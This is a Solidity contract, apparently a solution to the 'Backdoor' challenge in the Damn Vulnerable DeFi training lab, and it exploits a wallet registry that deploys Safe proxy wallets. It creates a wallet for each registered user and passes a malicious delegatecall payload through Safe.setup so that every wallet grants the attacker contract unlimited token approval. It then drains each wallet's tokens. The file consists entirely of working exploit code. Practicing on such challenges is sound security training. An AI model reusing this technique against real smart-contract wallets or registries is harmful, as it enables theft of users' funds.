// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;
import {Safe} from "safe-smart-account/contracts/Safe.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {WalletRegistry} from "./WalletRegistry.sol";

contract HackWalletRegistry{

    constructor(){        
    }

    function attack(SafeProxyFactory walletFactory, address singletonCopy, address[] memory userArray, WalletRegistry walletRegistry, address tokenAddress, address recovery) external{

        DamnValuableToken token = DamnValuableToken(tokenAddress);

        for (uint i = 0; i < userArray.length; i++){
            address newOwner = userArray[i];
            address[] memory owners = new address[](1);
            owners[0] = newOwner;

            bytes memory maliciousData = abi.encodeCall(this.approveTokens, (token, address(this)));

            bytes memory initializer = abi.encodeCall(Safe.setup, (owners, 1, address(this), maliciousData, address(0), address(0), 0, payable(address(0))));

            SafeProxy proxy = walletFactory.createProxyWithCallback(singletonCopy, initializer, 1, walletRegistry);

            token.transferFrom(address(proxy), address(this), token.balanceOf(address(proxy)));

        }

        token.transfer(recovery, 40 ether);

    }

    function approveTokens(DamnValuableToken _token, address spender) external{
        _token.approve(spender, type(uint256).max);
    }

}